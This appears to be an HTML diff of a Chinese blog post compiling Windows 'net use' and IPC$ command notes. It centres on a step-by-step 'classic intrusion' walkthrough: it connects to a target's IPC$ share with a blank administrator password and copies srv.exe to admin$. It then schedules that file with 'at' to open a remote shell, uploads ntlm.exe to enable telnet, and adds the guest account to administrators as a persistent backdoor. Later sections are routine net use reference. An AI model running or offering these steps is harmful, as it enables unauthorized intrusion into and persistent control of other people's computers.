+<p>注意：时间尽量使用24小时制；在系统默认搜索路径（比如system32/）下不用加路径，否则必须加全路径&nbsp;</p>
+<p>14 开启远程主机的telnet&nbsp;</p>
+<p>这里要用到一个小程序：opentelnet.exe，各大下载站点都有，而且还需要满足四个要求：&nbsp;</p>
+<p>&nbsp;</p>
+<p>1）目标开启了ipc$共享&nbsp;</p>
+<p>2）你要拥有管理员密码和帐号&nbsp;</p>
+<p>3）目标开启RemoteRegistry服务，用户就该ntlm认证&nbsp;</p>
+<p>4）对WIN2K/XP有效，NT未经测试&nbsp;</p>
+<p>命令格式：OpenTelnet.exe \\server account psw NTLM认证方式 port&nbsp;</p>
+<p>试例如下：c:\&gt;OpenTelnet.exe \\*.*.*.* administrator "" 1 90&nbsp;</p>
+<p>&nbsp;</p>
+<p>15 激活用户/加入管理员组&nbsp;</p>
+<p>1 net uesr account /active:yes&nbsp;</p>
+<p>2 net localgroup administrators account /add&nbsp;</p>
+<p>&nbsp;</p>
+<p>16 关闭远程主机的telnet&nbsp;</p>
+<p>同样需要一个小程序：ResumeTelnet.exe&nbsp;</p>
+<p>命令格式：ResumeTelnet.exe \\server account psw&nbsp;</p>
+<p>试例如下：c:\&gt;ResumeTelnet.exe \\*.*.*.* administrator ""&nbsp;</p>
+<p>&nbsp;</p>
+<p>17 删除一个已建立的ipc$连接&nbsp;</p>
+<p>net use \\IP\ipc$ /del&nbsp;</p>
+<p>&nbsp;</p>
+<p>九 经典入侵模式&nbsp;</p>
+<p>这个入侵模式太经典了,大部分ipc教程都有介绍,我也就拿过来引用了,在此感谢原创作者!(不知道是哪位前辈)&nbsp;</p>
+<p>&nbsp;</p>
+<p>1. C:\&gt;net use \\127.0.0.1\IPC$ "" /user:"admintitrators"&nbsp;</p>
+<p>这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入administrators，命令即可成功完成。&nbsp;</p>
+<p>复制之前务必用net view \\IP这个命令看一下对方的共享情况&nbsp;</p>
+<p>2. C:\&gt;copy srv.exe \\127.0.0.1\admin$&nbsp;</p>
+<p>先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、d$，意思是C盘与D盘，这看你要复制到什么地方去了）。&nbsp;</p>
+<p>&nbsp;</p>
+<p>3. C:\&gt;net time \\127.0.0.1&nbsp;</p>
+<p>查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。&nbsp;</p>
+<p>&nbsp;</p>
+<p>4. C:\&gt;at \\127.0.0.1 11:05 srv.exe&nbsp;</p>
+<p>用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！）&nbsp;</p>
+<p>&nbsp;</p>
+<p>5. C:\&gt;net time \\127.0.0.1&nbsp;</p>
+<p>再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。&nbsp;</p>
+<p>&nbsp;</p>
+<p>6. C:\&gt;telnet 127.0.0.1 99&nbsp;</p>
+<p>这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的Shell。&nbsp;</p>
+<p>虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了&nbsp;</p>
+<p>&nbsp;</p>
+<p>7.C:\&gt;copy ntlm.exe \\127.0.0.1\admin$&nbsp;</p>
+<p>用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。&nbsp;</p>
+<p>&nbsp;</p>
+<p>8. C:\WINNT\system32&gt;ntlm&nbsp;</p>
+<p>输入ntlm启动（这里的C:\WINNT\system32&gt;指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！&nbsp;</p>
+<p>&nbsp;</p>
+<p>9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈)&nbsp;</p>
+<p>&nbsp;</p>
+<p>为了以防万一,我们再把guest激活加到管理组&nbsp;</p>
+<p>10. C:\&gt;net user guest /active:yes&nbsp;</p>
+<p>将对方的Guest用户激活&nbsp;</p>
+<p>&nbsp;</p>
+<p>11. C:\&gt;net user guest 1234&nbsp;</p>
+<p>将Guest的密码改为1234,或者你要设定的密码&nbsp;</p>
+<p>&nbsp;</p>
+<p>12. C:\&gt;net localgroup administrators guest /add&nbsp;</p>
+<p>将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机)&nbsp;</p>
+<p>&nbsp;</p>
+<p>另外,你也可以根据返回的错误号分析原因：&nbsp;</p>
+<p>&nbsp;</p>
+<p>错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；&nbsp;</p>
+<p>错误号51，Windows无法找到网络路径：网络有问题；&nbsp;</p>
+<p>错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；&nbsp;</p>
+<p>错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$；&nbsp;</p>
+<p>错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连；&nbsp;</p>
+<p>错误号1326，未知的用户名或错误密码：原因很明显了；&nbsp;</p>
+<p>错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；&nbsp;</p>
+<p>错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</p>
+<p>&nbsp;&nbsp;&nbsp; 在使用这种方法屏蔽网络映射功能时，只需要先打开系统的运行对话框，并在其中执行“cmd”字符串命令，将系统界面切换到MS-DOS命令行状态；接着在DOS提示符下执行“net use x：/del”字符串命令，就能将网络磁盘分区为“X”的网络映射连接断开了，要想快速地将本地计算机中所有的网络映射连接断开的话，只需要执行“net use * /del”字符串命令就可以了。</p>
+<p>&nbsp;</p>
+<p>出处：https://www.cnblogs.com/mamiyiya777/p/11017875.html</p>
+<p>=======================================================================================</p>
+<p>WINDOWS2003（或其他的windows服务器）在局域网共享文件时，有时候测试的时候要更换登陆的用户名。使用NET USE 命令可以方便处理。</p>
+<h2>1）删除已有的连接，避免出现“一个用户使用...多重连接”的问题。</h2>
+<p>net use * /delete</p>
+<p>如果提示“列表是空的”，表示当前没有任何关联连接；如果提示“您有如下远程连接... 继续运行会取消连接”，输入“Y”或者“y”</p>
+
+<h2>2)建立非空连接:</h2>
+<p>net use \IP\ipc$ "密码" /user:"用户名" (同样有3个空格)</p>
+
+
+<h1><strong>参考net use命令详解及实例</strong></h1>
+<h2>1)建立空连接:</h2>
+<p>net use \IP\ipc$ "" /user:"" (一定要注意:这一行命令中包含了3个空格)</p>
+<h2>2)建立非空连接:</h2>
+<p>net use \IP\ipc$ "密码" /user:"用户名" (同样有3个空格)</p>
+<h2>3)映射默认共享:</h2>
+<p>net use z: \IP\c$ "密码" /user:"用户名" (即可将对方的c盘映射为自己的z盘，其他盘类推)</p>
+<p>如果已经和目标建立了ipc 则可以直接用IP+盘符+" 访问,具体命令 net use z: \IP\c$</p>
+<h2>4)删除一个ipc$连接</h2>
+<p>net use \IP\ipc$ /del</p>
+<h2>5)删除共享映射</h2>
+<p>net use c: /del 删除映射的c盘，其他盘类推</p>
+<p>net use * /del 删除全部,会有提示要求按y确认</p>
+<h2>6)查看远程主机的共享资源（但看不到默认共享）</h2>
+<p>net view \IP</p>
+<h2>7)查看本地主机的共享资源（可以看到本地的默认共享）</h2>
+<p>net share</p>
+<h2>8)得到远程主机的用户名列表</h2>
+<p>nbtstat -A IP</p>
+<h2>9)得到本地主机的用户列表</h2>
+<p>net user</p>
+<h2>10)查看远程主机的当前时间</h2>
+<p>net time \IP</p>
+<h2>11)显示本地主机当前服务</h2>
+<p>net start</p>
+<h2>12)启动/关闭本地服务</h2>
+<p>net start 服务名 /y</p>
+<p>net stop 服务名 /y</p>
+<h2>13)映射远程共享:</h2>
+<p>net use z: \IP\baby</p>
+<p>此命令将共享名为baby的共享资源映射到z盘</p>
+<h2>14)删除共享映射</h2>
+<p>net use c: /del 删除映射的c盘，其他盘类推</p>
+<p>net use * /del /y删除全部</p>
+<h2>15)激活用户/加入管理员组</h2>
+<p>1 net uesr account /active:yes</p>
+<p>2 net localgroup administrators account /add</p>
+<h2>16)删除一个已建立的ipc$连接</h2>
+<p>net use \IP\ipc$ /del</p>
+<p>&nbsp;</p>
+<p>出处：https://www.jianshu.com/p/ebe23e62f0ad?utm_campaign=maleskine</p>
+<p>=======================================================================================</p>
+</div>
 </body>
 </html>
